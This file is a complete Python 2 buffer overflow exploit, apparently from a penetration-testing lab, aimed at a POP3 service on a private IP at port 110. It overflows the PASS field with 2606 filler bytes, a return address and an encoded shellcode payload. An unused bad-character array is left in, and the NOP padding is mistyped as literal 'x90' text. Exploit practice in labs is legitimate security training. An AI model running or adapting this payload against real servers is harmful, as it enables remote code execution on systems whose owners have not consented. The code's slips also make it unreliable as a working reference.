#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

buf =  ""
buf += "\xd9\xc7\xba\x88\xf5\x24\xe8\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc\x03\xde\xe6\xc6"
buf += "\x1d\x22\xe0\x85\xde\xda\xf1\xe9\x57\x3f\xc0\x29\x03"
buf += "\x34\x73\x9a\x47\x18\x78\x51\x05\x88\x0b\x17\x82\xbf"
buf += "\xbc\x92\xf4\x8e\x3d\x8e\xc5\x91\xbd\xcd\x19\x71\xff"
buf += "\x1d\x6c\x70\x38\x43\x9d\x20\x91\x0f\x30\xd4\x96\x5a"
buf += "\x89\x5f\xe4\x4b\x89\xbc\xbd\x6a\xb8\x13\xb5\x34\x1a"
buf += "\x92\x1a\x4d\x13\x8c\x7f\x68\xed\x27\x4b\x06\xec\xe1"
buf += "\x85\xe7\x43\xcc\x29\x1a\x9d\x09\x8d\xc5\xe8\x63\xed"
buf += "\x78\xeb\xb0\x8f\xa6\x7e\x22\x37\x2c\xd8\x8e\xc9\xe1"
buf += "\xbf\x45\xc5\x4e\xcb\x01\xca\x51\x18\x3a\xf6\xda\x9f"
buf += "\xec\x7e\x98\xbb\x28\xda\x7a\xa5\x69\x86\x2d\xda\x69"
buf += "\x69\x91\x7e\xe2\x84\xc6\xf2\xa9\xc0\x2b\x3f\x51\x11"
buf += "\x24\x48\x22\x23\xeb\xe2\xac\x0f\x64\x2d\x2b\x6f\x5f"
buf += "\x89\xa3\x8e\x60\xea\xea\x54\x34\xba\x84\x7d\x35\x51"
buf += "\x54\x81\xe0\xf6\x04\x2d\x5b\xb7\xf4\x8d\x0b\x5f\x1e"
buf += "\x02\x73\x7f\x21\xc8\x1c\xea\xd8\x9b\xe2\x43\xe3\xd4"
buf += "\x8b\x91\xe3\xfb\x17\x1f\x05\x91\xb7\x49\x9e\x0e\x21"
buf += "\xd0\x54\xae\xae\xce\x11\xf0\x25\xfd\xe6\xbf\xcd\x88"
buf += "\xf4\x28\x3e\xc7\xa6\xff\x41\xfd\xce\x9c\xd0\x9a\x0e"
buf += "\xea\xc8\x34\x59\xbb\x3f\x4d\x0f\x51\x19\xe7\x2d\xa8"
buf += "\xff\xc0\xf5\x77\x3c\xce\xf4\xfa\x78\xf4\xe6\xc2\x81"
buf += "\xb0\x52\x9b\xd7\x6e\x0c\x5d\x8e\xc0\xe6\x37\x7d\x8b"
buf += "\x6e\xc1\x4d\x0c\xe8\xce\x9b\xfa\x14\x7e\x72\xbb\x2b"
buf += "\x4f\x12\x4b\x54\xad\x82\xb4\x8f\x75\xb2\xfe\x8d\xdc"
buf += "\x5b\xa7\x44\x5d\x06\x58\xb3\xa2\x3f\xdb\x31\x5b\xc4"
buf += "\xc3\x30\x5e\x80\x43\xa9\x12\x99\x21\xcd\x81\x9a\x63"

buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "x90" * 8 + buf

try:
  print "\nSending evil buffer..."
  s.connect(('192.168.1.93',110))
  data = s.recv(1024)
  s.send('USER username' +'\r\n')
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  s.close()
  print "\nDone!"
except:
  print "Could not connect to POP3!"